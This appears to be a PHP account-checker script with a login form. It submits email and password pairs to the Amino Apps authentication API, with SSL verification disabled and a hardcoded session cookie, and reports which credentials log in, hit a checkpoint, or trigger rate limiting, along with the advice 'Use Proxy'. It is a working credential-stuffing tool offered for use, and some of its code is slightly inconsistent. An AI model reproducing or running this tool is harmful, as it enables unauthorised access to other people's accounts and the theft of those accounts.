<form action="" method="post">
<center>
$~ Dev By <font color="red">You</font> :)<br>
<font color="red"> Username :<input type="text" name="username"></font><br><br>
<font color="red"> Password :<input type="text" name="password"></font><br><br>
<input type="submit" name="submit" value="Login">
</center>
</form>
<?
$email = $_POST['email'];
$password = $_POST['password'];
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, "https://aminoapps.com/api/auth"); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Accep":*/*',
    'Accept-Language: en-US,en;q=0.5',
    'Accept-Encoding: gzip, deflate, br',
    'Referer: https://aminoapps.com/',
    'X-Requested-With: xmlhttprequest',
    'Content-Type: application/json',
    'Origin: https://aminoapps.com',
    'Content-Length: "642',
    'Connection: keep-alive',
    'Cookie: exp=60-0; session=.eJwVik8LgjAcQL9K_M4dTO0ieDAUUdjG4hdju0jp8E-bhFjkxO-e8S4P3luheunJ3kc9zhDN01sfodGfvtZV30C0wuEBERCsQ4rcI7kyZLg5gl2nhjZQmC3Scp-6a0-dMSwtDU2TvRdnZZWRjgdkKPf3T2eZkAsR2ZelzZP6MqSiCJngJ4m7Y-IpvFjZxjFs2w-p0jNd.Yukw-w.Ryni8e3djX1VIJDhxl-QTB48v5Q; GLAM-JID=5245bebf3c324b08b0f757a2103c9db5; GLAM-AID=ff35a99fced0406f893a14e4d938033b; GLAM-SID=3ce9034c22fc4558952f6117b8506b8f; __j_state=%7B%22landing_url%22%3A%22https%3A%2F%2Faminoapps.com%2F%22%2C%22pageViews%22%3A1%2C%22prevPvid%22%3A%2288b4f7cee6284fcd9b50613fd75b532b%22%2C%22extreferer%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22user_worth%22%3A0%7D; _ga_9SJ4LCCH1X=GS1.1.1659449588.1.0.1659449588.0; _ga=GA1.2.1816831851.1659449589; __asc=c6aca8ff1825ee73e41969b7330; __auc=c6aca8ff1825ee73e41969b7330; AMP_TOKEN=%24NOT_FOUND; gdpr_cookie_agreee=1; _gid=GA1.2.232492326.1659449590; _gat=1; __qca=P0-1348985531-1659449591036; __gads=ID=7af8ec53a4efbdd8-228f399c7ad40027:T=1659449591:S=ALNI_MbqviJc1-NTTCarQ4b_THh5tj85Xg; __gpi=UID=00000a6ee888a2e1:T=1659449591:RT=1659449591:S=ALNI_MZRNOVIPKh0AyMAp__1bhb0E5MF_A; G_ENABLED_IDPS=google',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'TE: trailers'
    ));
curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$email&password=$password");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$check = curl_exec($ch);
if(eregi("true", $check))
	{
		echo "<center>Logged -> $email:$password </center>";
	}
	else
	{
		if(eregi("checkpoint", $check))
		{
			echo "<center>Logged But CheckPoint :( -> $email:$password </center>";
		}
		else
		{
			if(eregi("Please wait a few minutes before you try again.", $check))
			{
				echo "<center> Use Proxy </center>";
			}
			else
			{
				echo "<center> Failed -> $email:$password </center>";
			}
		}
	}
curl_close($ch);